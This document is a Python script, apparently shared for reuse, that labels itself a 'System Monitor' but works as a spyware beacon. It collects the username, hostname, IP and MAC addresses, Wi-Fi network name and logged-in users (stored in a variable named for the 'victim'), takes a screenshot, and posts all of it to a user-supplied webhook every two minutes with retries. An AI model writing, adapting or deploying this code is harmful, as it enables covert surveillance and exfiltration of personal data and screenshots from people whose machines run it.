


import io
import requests
import socket
import getpass
from datetime import datetime
import platform
import psutil, time
import uuid
import subprocess
import pyautogui
import json
import random

WEBHOOK_URL = "YOUR_WEBHOOK_HERE" # Paste your webHook here within the double quotes.


def wait_for_internet(timeout=60):
    start = time.time()
    while time.time() - start < timeout:
        try:
            socket.create_connection(("8.8.8.8", 53))
            return True
        except OSError:
            time.sleep(3)
    return False

def send_startup_message():
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    OS = platform.platform()
    archiOS = platform.architecture()[0]
    machineOS = platform.machine()
    cpu = platform.processor() 

    ram = psutil.virtual_memory().percent
    memoryWin = psutil.disk_usage("C:\\").percent
    try:
        memoryLin = psutil.disk_usage("/").percent # we can skip this part for the sake of understanding.
    except:
        memoryLin = "N/A"

    battery = psutil.sensors_battery()
    battery_percent = battery.percent if battery else "No Battery" # from my pov this a ternatariy line.

    private_ip = socket.gethostbyname(hostname)
    try:
        public_ip = requests.get("https://api.ipify.org").text
    except:
        public_ip = "N/A"

    mac_address = ":".join(hex(uuid.getnode())[2:][i:i+2] for i in range(0, 12, 2))

    try:
        output = subprocess.check_output("netsh wlan show interfaces", shell=True).decode()
        ssid = next((line.split(":")[1].strip() for line in output.splitlines() if "SSID" in line and "BSSID" not in line), "N/A")
    except:
        ssid = "N/A"

    uptime = time.time() - psutil.boot_time()
    last_login = datetime.fromtimestamp(psutil.boot_time())
    users = psutil.users()  
    active_users_in_victim = len(users)

    # Take screenshot in memory
    screenshot_bytes = io.BytesIO()
    pyautogui.screenshot().save(screenshot_bytes, format="PNG")
    screenshot_bytes.seek(0)  # Reset pointer to start

    # different colours
    dif_colours = [0x00ff00, 0x2ecc71, 0x1abc9c, 0xff0000, 0xe74c3c, 0xc0392b, 0x3498db, 0x2980b9, 0x00ffff, 0x9b59b6, 0x8e44ad, 0xf1c40f, 0xf39c12, 0xff5733]
    ran = random.randint(0,13)

    # Prepare embed
    embed = {
        "title": "💻 Computer Started!",
        "description": "**System Monitor Online!**",
        "color": dif_colours[ran],
        "fields": [
            {"name": "User", "value": username, "inline": True},
            {"name": "Host", "value": hostname, "inline": True},
            {"name": "Private IP", "value": private_ip, "inline": True},
            {"name": "Public IP", "value": public_ip, "inline": True},
            {"name": "OS", "value": f"{OS} | {archiOS} | {machineOS}", "inline": False},
            {"name": "CPU", "value": cpu, "inline": True},
            {"name": "RAM Usage", "value": f"{ram}%", "inline": True},
            {"name": "Disk Usage", "value": f"Windows: {memoryWin}% | Linux: {memoryLin}%", "inline": True},
            {"name": "Battery", "value": f"{battery_percent}", "inline": True},
            {"name": "MAC Address", "value": mac_address, "inline": True},
            {"name": "Wi-Fi SSID", "value": ssid, "inline": True},
            {"name": "Uptime", "value": str(uptime), "inline": True},
            {"name": "Last Login", "value": str(last_login), "inline": True},
            {"name": "Active Users", "value": str(active_users_in_victim), "inline": True}
        ],
        "image": {"url": "attachment://startup_screenshot.png"}
    }

    payload = {"embeds": [embed]}

    # ========= Send webhook with retries =========
    while True:
        if wait_for_internet():
            try:
                requests.post(WEBHOOK_URL, data={"payload_json": json.dumps(payload)}, files={"file": ("startup_screenshot.png", screenshot_bytes, "image/png")})
                print("Webhook sent successfully!")
                break
            except Exception as e:
                print("Error sending webhook, retrying in 10s:", e)
                time.sleep(10)
        else:
            print("No internet, retrying in 10s...")
            time.sleep(10)


# This program is best for windows. I will work more for this in linux and mac.
if __name__ == "__main__":
    while True:
        send_startup_message()
        time.sleep(120)  # wait 2 minutes before sending again


